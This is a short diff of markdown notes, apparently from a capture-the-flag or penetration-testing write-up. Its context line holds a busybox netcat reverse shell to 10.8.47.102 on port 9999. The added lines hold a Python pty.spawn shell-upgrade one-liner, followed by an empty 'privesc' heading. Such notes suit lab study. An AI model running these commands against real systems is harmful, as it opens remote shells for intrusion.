@@ -85,6 +85,17 @@ busybox nc 10.8.47.102 9999 -e bash
 
 <img width="950" height="441" alt="image" src="https://github.com/user-attachments/assets/08ac72d6-939e-4ca9-bb45-a37c9a3140c0" />
 
+```
+python3 -c 'import pty,os; pty.spawn("/bin/bash")'
+```
+
+
+----
+
+
+## privesc
+
+
 
 
 
